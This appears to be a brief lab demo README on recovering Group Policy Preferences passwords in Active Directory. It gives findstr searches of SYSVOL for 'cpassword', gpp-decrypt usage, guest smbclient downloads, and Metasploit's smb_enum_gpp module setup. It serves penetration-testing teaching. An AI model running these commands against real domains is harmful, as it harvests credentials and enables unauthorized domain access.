# GPP Attack LAB DEMO

### SCENARIO 1: 

In the first scenario, if we have a valid domain shell we can use it to search through the system and find the SYSVOL folder and access GROUPS.xml

```bash
findstr /S /I cpassword \\DOMAIN\sysvol\DOMAIN\policies\*.xml
```
Once we get the encrypted password, we can decrypt it using an inbuilt KALI tool called `gpp_decrypt`

```bash
gpp-decrypt "ENCRYPTED PASSWORD"
```

### SCENARIO 2:

If we don't have a domain user shell. Check if we are allowed to connect to any share as guest then we can find the `cpassword` value from the files on `SYSVOL` and pass them to the `gpp-decrypt`

```
smbclient \\\\TARGET IP\\SHARE

mget *
```

We can access a open share using `smbclient` and then download all the files to the the local machine using `mget *`. Then find the `cPassword` and decrypt it. 

We can also use Metasploit modules to automatically find and get the cleartext password.

```
use auxiliary/scanner/smb/smb_enum_gpp
set RHOSTS <TARGET IP>
set SMBDomain <TARGET DOMAIN>
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
exploit
```
